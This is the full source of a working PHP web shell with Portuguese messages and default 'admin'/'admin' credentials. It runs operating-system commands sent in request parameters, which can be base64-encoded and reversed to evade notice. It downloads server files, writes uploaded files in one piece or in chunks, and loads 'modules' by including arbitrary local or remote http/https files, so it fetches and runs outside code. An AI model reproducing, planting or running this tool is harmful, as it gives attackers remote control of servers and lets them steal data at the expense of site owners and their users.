<?php
if(isset($_GET['st'])){
	exit('online');
}

session_start();

class WebShell{
	private $cmds = array();
	private $cmd = '';
	private $args = '';
	private $code = 200;
	private $body = '';
	public $is_win = false;
	private $content_type = 'text/plain;charset=utf-8;';
	private $outputEncoded = false;
	
	public function getValue($name, $default_value=false, $encoded=false, $rev=false){
		$v = isset($_GET[$name]) ? $_GET[$name] : (isset($_POST[$name]) ? $_POST[$name] : $default_value);
		return $encoded ? @base64_decode($rev?strrev($v):$v) : $v;
	}
	public function __construct($user=false, $pass=false){
		$this->credentials = (object) array('user' => false, 'pass' => false);
		$this->encoded = intval($this->getValue('e', 0)) == 1;
		$this->outputEncoded = intval($this->getValue('b', '0')) == 1;
		$cmd = $this->getValue('a', '', $this->encoded, true);
		$this->credentials->user = $user;
		$this->credentials->pass = $pass;
		if(!isset($_SESSION['modules'])){
			$_SESSION['modules'] = array();
		}

		if(strlen($cmd) > 0){
			$cmd = explode(' ', $cmd, 2);
			$this->cmd = $cmd[0];
			$this->args = isset($cmd[1]) ? $cmd[1] : '';
		}
		else{
			$this->cmd = false;
		}
	}
	private function auth(){
		if(isset($_SESSION['logged'])){
			return true;
		}

		if(!$this->credentials->user || !$this->credentials->pass){
			$this->createSession();
			return true;
		}

		$u = $this->getValue('u', false, $this->encoded);
		$p = $this->getValue('p', false, $this->encoded);
		if(!is_string($u) || !is_string($p)){
			$auth_header = false;
			foreach(getallheaders() as $header){
				$header = explode(': ', $header, 2);
				if(sizeof($header) == 2 && strtolower($header[0]) === 'authorization' && strpos(strtolower($header[1]), 'basic ') === 0){
					$auth_header = explode(':', @base64_decode(substr($header[1], 6)), 2);
					if(sizeof($auth_header) !== 2){
						$auth_header = false;
					}
					break;
				}
			}
			if(!$auth_header){
				return false;
			}
			$u = $auth_header[0];
			$p = $auth_header[1];
		}

		if($this->credentials->user === $u && $this->credentials->pass === $p){
			$this->createSession();
			return true;	
		}
		return false;
	}
	private function createSession(){
		$_SESSION['path'] = trim(shell_exec($this->is_win ? 'echo %cd%' : 'pwd'));
		$_SESSION['user'] = trim(shell_exec($this->is_win ? 'echo %USERNAME%': 'whoami'));
		$_SESSION['logged'] = 1;
		$_SESSION['uploading'] = false;
		$_SESSION['upload_name'] = '';
		$_SESSION['upload_tmp'] = '';
		$_SESSION['modules'] = array();

		if($this->is_win){
			$_SESSION['path'] = str_replace('\\', '/', substr($_SESSION['path'], 2));
		}
		if($_SESSION['path'] !== '/'){
			$_SESSION['path'] .= '/';
		}
		return;
	}
	public function moduleExists($name){
		return isset($_SESSION['modules'][$name]);
	}
	public function moduleAdd($name, $file){
		if(isset($_SESSION['modules'][$name])){
			return "Modulo '".$name."' já foi carregado";
		}
		$_SESSION['modules'][$name] = $file;
		return "Modulo '".$name."' - '".$file."' adicionado";
	}
	public function moduleRemove($name){
		if(isset($_SESSION['modules'][$name])){
			unset($_SESSION['modules'][$name]);
			return "Modulo '".$name."' removido";
		}
		return "Modulo '".$name."' não foi carregado";
	}
	public function moduleLoad(){
		foreach($_SESSION['modules'] as $name => $file){
			@include_once($file);
		}
	}
	public function on($cmd, $callback){
		if($this->cmd){
			$this->cmds[$cmd] = $callback;
		}
	}
	public function setResponse($msg, $code=200, $ct='text/plain;charset=utf-8;'){
		$this->code = $code;
		$this->body = $msg;
		$this->content_type = $ct;
	}
	public function response(){
		if(!$this->auth()){
			http_response_code(401);
			return;
		}
		if(strlen($this->cmd) > 0){
			if(isset($this->cmds[$this->cmd]) && is_callable($this->cmds[$this->cmd])){
				$this->cmds[$this->cmd]($this->args, strlen($this->args));	
			}
			else{
				$this->body = trim(shell_exec('cd '.$_SESSION['path'].' && '.$this->cmd.(strlen($this->args) > 0 ? ' '.$this->args : '').' 2>&1'));
			}
		}
		$this->print_response();

	}
	public function clear_path($path){
		$path = realpath($path);
		if(!$path){
			return false;
		}
		if($this->is_win){
			if(strpos($path, ':\\') === 1){
				$path = str_replace(':/', '', str_replace('\\', '/', $path));
			}
		}
		if(is_dir($path) && $path !== '/'){
			$path .= '/';
		}
		return $path;
	}
	public function local_path($path){
		if($path[0] === '/'){
			return $this->clear_path($path);
		}
		return $this->clear_path($_SESSION['path'].$path);
	}
	private function print_response(){
		http_response_code($this->code);
		header('Content-Type: '.$this->content_type);
		header('X-User: '.($this->outputEncoded ? base64_encode($_SESSION['user']) : $_SESSION['user']));
		header('X-Path: '.($this->outputEncoded ? base64_encode($_SESSION['path']) : $_SESSION['path']));
		exit($this->outputEncoded ? @base64_encode($this->body) : $this->body);
	}
}


$wShell = new  WebShell('admin', 'admin');
$wShell->moduleLoad();
$wShell->on('cd', function($args, $len) use ($wShell){


	$out = trim(shell_exec('cd '.$_SESSION['path'].' && cd'.(strlen($args) > 0 ? ' '.$args : ''). ' 2>&1'));

	if(strlen($out) > 5){
		$wShell->setResponse($out);
		return;
	}

	$out = trim(shell_exec('cd '.$_SESSION['path'].' && cd'.(strlen($args) > 0 ? ' '.$args : '').' && '.($wShell->is_win ? 'echo %cd%' : 'pwd').' 2>&1'));
	
	$path = $wShell->clear_path($out);
	if(!$path){
		$wShell->setResponse($out);
		return;
	}
	$_SESSION['path'] = $path;
	return;
});
$wShell->on('download', function($args, $len) use ($wShell){
	if($len < 1){
		$wShell->setResponse('Informe o nome do arquivo', 400);
		return;
	}
	$file = $wShell->local_path($args);
	if(!$file || !is_file($file)){
		$wShell->setResponse("O arquivo '".(is_string($file) ? $file : $args)."' não foi encontrado", 404);
		return;
	}
	if(!is_readable($file)){
		$wShell->setResponse("Usuário não tem permissão para ler o arquivo '".$file."'", 403);
		return;
	}
	header('Content-Type: application/octet-stream');
	header('Content-Length: '.filesize($file));
	header('Expires: 0');
	header('Content-Disposition: filename='.basename($file));
	if(!@readfile($file)){
		$wShell->setResponse("Não foi possível baixar o arquivo '".$file."'", 500);
	}
	else{
		$wShell->setResponse('', 200);
	}
	return;
});
$wShell->on('upload', function($args, $len) use ($wShell){
	if($len < 1){
		return;
	}
	$info = (object) pathinfo($args);
	if($len < 1 || !isset($info->basename) || strlen($info->basename) < 1){
		$wShell->setResponse('Não foi informado o nome do arquivo', 400);
		return;
	}
	$path = $wShell->local_path(isset($info->dirname) ? $info->dirname : '');
	if(!$path){
		$wShell->setResponse("O path '".(isset($info->dirname) ? $info->dirname : $_SESSION['path'])."' não foi encontrado", 404);
		return;
	}
	if(!is_writable($path)){
		$wShell->setResponse("Usuário não tem permissão de escrita do diretório '".$path."'", 403);
		return;
	}
	if(file_exists($path.$info->basename)){
		$wShell->setResponse("O arquivo '".$path.$info->basename."' já existe no servidor", 202);
		return;
	}
	if(!is_writable($path)){
		$wShell->setResponse("Usuário não tem permissão de escrita do diretório '".$path."'", 403);
		return;
	}
	if(!isset($_FILES['f'])){
		$wShell->setResponse('Nenhum arquivo foi enviado', 400);
		return;
	}
	if(!is_uploaded_file($_FILES['f']['tmp_name'])){
		$wShell->setResponse('Arquivo não foi enviado corretamente', 406);
		return;
	}
	if(@move_uploaded_file($_FILES['f']['tmp_name'], $path.$info->basename)){
		$wShell->setResponse("Arquivo salvo em '".$path.$info->basename."'", 201);
	}
	else{
		$wShell->setResponse("Não foi possível mover o arquivo de '".$_FILES['f']['tmp_name']."' para '".$path.$info->basename."'");
	}
	return;

});
$wShell->on('start-upload', function($args, $len) use ($wShell){
	if($_SESSION['uploading']){
		$wShell->setResponse('Já existe um upload em progress, use cancel-upload', 202);
		return;
	}
	$info = (object) pathinfo($args);

	if($len < 1 || !isset($info->basename) || strlen($info->basename) < 1){
		$wShell->setResponse('Não foi informado o nome do arquivo', 400);
		return;
	}
	$path = $wShell->local_path(isset($info->dirname) ? $info->dirname : '');
	if(!$path){
		$wShell->setResponse("O path '".(isset($info->dirname) ? $info->dirname : $_SESSION['path'])."' não foi encontrado", 404);
		return;
	}
	if(!is_writable($path)){
		$wShell->setResponse("Usuário não tem permissão de escrita do diretório '".$path."'", 403);
		return;
	}
	if(file_exists($path.$info->basename)){
		$wShell->setResponse("O arquivo '".$path.$info->basename."' já existe no servidor", 202);
		return;
	}
	$_SESSION['upload_tmp'] = $path.hash('adler32', uniqid(rand(), true)).'.tmp';
	$_SESSION['upload_name'] = $path.$info->basename;
	$_SESSION['uploading'] = true;
	return;
});
$wShell->on('upload-block', function($args, $len) use ($wShell){
	if(!$_SESSION['uploading']){
		$wShell->setResponse('Nenhum upload em progresso', 406);
		return;
	}
	if($len < 1){
		$wShell->setResponse('Nenhum conteúdo informado', 406);
		return;
	}
	$file = fopen($_SESSION['upload_tmp'], 'a');
	if(!$file){
		$wShell->setResponse("Não foi possível abrir o arquivo '".$_SESSION['upload_tmp']."'", 500);
		return;
	}
	fwrite($file, @base64_decode($args));
	fclose($file);
	return;
});
$wShell->on('stop-upload', function($args, $len) use ($wShell){

	if(!$_SESSION['uploading']){

		$wShell->setResponse('Nenhum upload em progresso', 200);
		return;
	}
	if(!@rename($_SESSION['upload_tmp'], $_SESSION['upload_name'])){
		$wShell->setResponse("Não foi possível mover o arquivo de '".$_SESSION['upload_tmp']."' para '".$_SESSION['upload_name']."'");
	}
	else{
		$wShell->setResponse("Arquivo salvo em '".$_SESSION['upload_name']."'", 201);
	}
	@unlink($_SESSION['upload_tmp']);
	$_SESSION['uploading'] = false;
	$_SESSION['upload_name'] = '';
	$_SESSION['upload_tmp'] = '';
	return;
});
$wShell->on('cancel-upload', function($args, $len) use ($wShell){
	if(!$_SESSION['uploading']){
		return;
	}
	$_SESSION['uploading'] = false;
	$_SESSION['upload_name'] = '';
	$_SESSION['upload_tmp'] = '';
	if(file_exists($_SESSION['upload_tmp'])){
		@unlink($_SESSION['upload_tmp']);
	}
	return;
});
//module-add name file
$wShell->on('module-add', function($args, $len) use ($wShell){
	$args = explode(' ', $args, 2);
	if($len < 1 || !is_array($args) || sizeof($args) != 2 || strlen($args[0]) < 1 || strlen($args[1]) < 1){
		return $wShell->setResponse('Use module-add [nome] [arquivo]', 400);
	}
	if(!preg_match('(^https:\/\/|^http:\/\/)', $args[1])){
		$args[1] = $wShell->local_path($args[1]);
		if(!$args[1] || !is_file($args[1])){
			return $wShell->setResponse("Arquivo '".$args[1]."' não foi encontrado", 404);
		}
		if(!is_readable($args[1])){
			return $wShell->setResponse("Não é possível ler o arquivo '".$args[1]."'", 404);
		}
	}
	return $wShell->setResponse($wShell->moduleAdd($args[0], $args[1]));
});
$wShell->on('module-remove', function($args, $len) use ($wShell){
	if($len < 1){
		return $wShell->setResponse('Use module-remove [nome]', 400);
	}
	return $wShell->setResponse($wShell->moduleRemove($args));
});
$wShell->on('module-list', function($args, $len) use ($wShell){
	$response = "Modulos:".PHP_EOL;

	foreach($_SESSION['modules'] as $name => $file){
		$response .= $name.' => '.$file;
	}
	$wShell->setResponse($response);
});
$wShell->response();
